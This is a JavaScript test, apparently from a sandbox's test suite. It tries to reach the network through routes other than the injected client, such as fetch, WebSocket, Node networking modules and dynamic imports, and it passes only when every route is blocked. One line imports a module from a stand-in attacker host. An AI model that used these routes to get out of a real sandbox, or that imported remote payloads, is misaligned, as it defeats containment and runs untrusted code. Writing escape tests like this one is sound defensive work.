// Attempt: reach the network without the injected client.
export default async function ({ client, check }) {
  const attempts = {};
  const record = async (name, fn) => {
    try {
      const value = await fn();
      attempts[name] = `REACHED: ${String(value).slice(0, 60)}`;
    } catch (error) {
      attempts[name] = `blocked: ${String(error?.message ?? error).slice(0, 80)}`;
    }
  };

  await record("globalThis.fetch", () => globalThis.fetch("http://127.0.0.1:1/"));
  await record("bare fetch", () => fetch("http://127.0.0.1:1/"));
  await record("Function-constructed fetch", () => new Function("return fetch('http://127.0.0.1:1/')")());
  await record("WebSocket", () => new globalThis.WebSocket("ws://127.0.0.1:1/"));
  await record("import node:http", async () => (await import("node:http")).request);
  await record("import http", async () => (await import("http")).request);
  await record("import node:net", async () => (await import("node:net")).connect);
  await record("import node:https", async () => (await import("node:https")).request);
  await record("import node:dns", async () => (await import("node:dns")).lookup);
  await record("import node:tls", async () => (await import("node:tls")).connect);
  await record("import node:dgram", async () => (await import("node:dgram")).createSocket);
  await record("getBuiltinModule net", () => process.getBuiltinModule("net").connect);
  await record("data: module", async () => (await import("data:text/javascript,export default 1")).default);
  await record("https: module", async () => (await import("https://evil.example/payload.mjs")).default);

  console.log(`ATTEMPTS ${JSON.stringify(attempts)}`);
  const escaped = Object.entries(attempts).filter(([, outcome]) => outcome.startsWith("REACHED"));
  const health = await client.get("/health");
  check({
    id: "no-ambient-network",
    obligation: "rule:boundary",
    title: "a script has no network but the injected client",
    pass: escaped.length === 0,
    expected: "every ambient network route blocked",
    observed: escaped.length ? JSON.stringify(escaped) : "all blocked",
    evidence: { requests: [health.ref] },
  });
}
